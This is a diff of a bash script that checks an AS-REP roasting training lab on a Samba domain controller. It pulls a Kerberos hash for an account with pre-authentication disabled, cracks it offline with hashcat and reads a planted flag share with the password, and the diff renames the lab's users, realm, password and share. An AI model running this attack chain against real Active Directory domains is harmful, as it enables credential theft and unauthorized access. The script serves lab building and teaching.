@@ -1,15 +1,15 @@
 #!/bin/bash
 # Proves the AS-REP roasting lab is correctly built and that its hash is genuinely crackable,
 # driven from inside the DC:
-#   0. the intended misconfiguration is present: jon.snow carries UF_DONT_REQUIRE_PREAUTH while
-#      an ordinary account (hodor) does not,
+#   0. the intended misconfiguration is present: svc-scanner carries UF_DONT_REQUIRE_PREAUTH while
+#      an ordinary account (l.nguyen) does not,
 #   1. the real-world no-credential roast (impacket GetNPUsers -no-pass) is exercised and shown
 #      to be refused by the Samba KDC (KDC_ERR_PREAUTH_REQUIRED) -- the documented Samba caveat,
 #   2. the crackable AS-REP enc-part is retrieved the way that DOES work against Samba: a native
-#      pre-authenticated, RC4-pinned AS-REQ (asrep.py) yields jon.snow's $krb5asrep$23$ hash,
-#   3. it is cracked offline with hashcat (mode 18200, RC4 AS-REP) -> jon.snow's password,
-#   4. that password reads the vault flag, which matches the one the DC planted.
-# Negative control: the ordinary account cannot read the vault.
+#      pre-authenticated, RC4-pinned AS-REQ (asrep.py) yields svc-scanner's $krb5asrep$23$ hash,
+#   3. it is cracked offline with hashcat (mode 18200, RC4 AS-REP) -> svc-scanner's password,
+#   4. that password reads the imaging flag, which matches the one the DC planted.
+# Negative control: the ordinary account cannot read the imaging share.
 #
 # Why not GetNPUsers for step 2? Samba's AD DC KDC demands pre-authentication even for accounts
 # flagged UF_DONT_REQUIRE_PREAUTH (verified against Samba 4.17 and 4.19), so the classic no-cred
@@ -21,10 +21,10 @@ set -uo pipefail
 
 export HOME=/root  # hashcat's compiled-kernel cache lives here (warmed at build time).
 
-REALM="NORTH.SEVENKINGDOMS.LOCAL"
-NOPREAUTH_USER="jon.snow"
-NOPREAUTH_PASS="Summer2023"   # planted by entrypoint.sh; used only to make the Samba KDC emit the AS-REP.
-DECOY_USER="hodor"
+REALM="LAKESIDE.LAB"
+NOPREAUTH_USER="svc-scanner"
+NOPREAUTH_PASS="Scanner2021"   # planted by entrypoint.sh; used only to make the Samba KDC emit the AS-REP.
+DECOY_USER="l.nguyen"
 USERLIST="/opt/asrep/users.txt"
 WORDLIST="/opt/asrep/wordlist.txt"
 PY="/opt/impacket-venv/bin/python3"
@@ -32,7 +32,7 @@ GETNP="${PY} /opt/impacket-venv/bin/GetNPUsers.py"
 ASREP="${PY} /opt/asrep/asrep.py"
 SAMLDB="/var/lib/samba/private/sam.ldb"
 DC_IP="127.0.0.1"
-PLANTED="/srv/vault/flag.txt"
+PLANTED="/srv/imaging/flag.txt"
 UF_DONT_REQ_PREAUTH=4194304  # 0x400000
 
 WORK="$(mktemp -d)"
@@ -73,17 +73,17 @@ CRACKED="$(hashcat -m 18200 --potfile-path="${POT}" --show "${HASH}" 2>/dev/null
 [ -n "${CRACKED}" ] || fail "hashcat did not recover ${NOPREAUTH_USER}'s password from the wordlist"
 echo "      recovered ${NOPREAUTH_USER} password: ${CRACKED}" >&2
 
-echo "[4/4] reading the vault as ${NOPREAUTH_USER} with the cracked password, then matching the flag ..." >&2
+echo "[4/4] reading the imaging share as ${NOPREAUTH_USER} with the cracked password, then matching the flag ..." >&2
 OUT="${WORK}/flag.out"
-smbclient //dc/vault -U "NORTH\\${NOPREAUTH_USER}%${CRACKED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
-  || fail "could not read the vault share as ${NOPREAUTH_USER}"
-[ -s "${OUT}" ] || fail "vault flag.txt came back empty"
+smbclient //dc/imaging -U "LAKESIDE\\${NOPREAUTH_USER}%${CRACKED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
+  || fail "could not read the imaging share as ${NOPREAUTH_USER}"
+[ -s "${OUT}" ] || fail "imaging flag.txt came back empty"
 diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
   || fail "flag read via ${NOPREAUTH_USER} does not match the planted flag"
 
-# Negative control: the ordinary account must NOT be able to read the vault.
-if smbclient //dc/vault -U "NORTH\\${DECOY_USER}%whatever" -c "ls" >/dev/null 2>&1; then
-  fail "vault is readable by ${DECOY_USER}; the flag is not gated behind ${NOPREAUTH_USER}"
+# Negative control: the ordinary account must NOT be able to read the imaging share.
+if smbclient //dc/imaging -U "LAKESIDE\\${DECOY_USER}%whatever" -c "ls" >/dev/null 2>&1; then
+  fail "imaging share is readable by ${DECOY_USER}; the flag is not gated behind ${NOPREAUTH_USER}"
 fi
 
 echo "CHECK PASS: DONT_REQ_PREAUTH(${NOPREAUTH_USER}) -> AS-REP -> crack (${CRACKED}) -> flag $(cat "${OUT}")" >&2
